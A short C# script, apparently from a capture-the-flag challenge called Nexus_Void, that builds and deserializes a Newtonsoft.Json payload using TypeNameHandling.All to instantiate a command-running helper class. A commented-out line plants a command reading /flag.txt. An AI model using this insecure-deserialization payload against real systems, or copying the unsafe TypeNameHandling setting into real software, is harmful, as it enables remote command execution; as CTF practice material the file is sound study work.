using Newtonsoft.Json;
using System.Collections.Generic;
using Nexus_Void.Helpers;
// See https://aka.ms/new-console-template for more information

// StatusCheckHelper statusCheckHelper = new StatusCheckHelper();
// statusCheckHelper.command = "echo 'cat /flag.txt' >> /tmp/mem.sh";

// Console.WriteLine(statusCheckHelper.output);

// string serializedResult = JsonConvert.SerializeObject(statusCheckHelper, new JsonSerializerSettings
// {
//     TypeNameHandling = TypeNameHandling.All
// });

// Console.WriteLine(serializedResult);

string serializedResult = "{\"$type\":\"Nexus_Void.Helpers.StatusCheckHelper, test\",\"output\":\"hola\",\"command\":\"echo 'hola' > /tmp/mem.sh\"}";

string deserializedResult = JsonConvert.DeserializeObject(serializedResult, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
}).ToString();


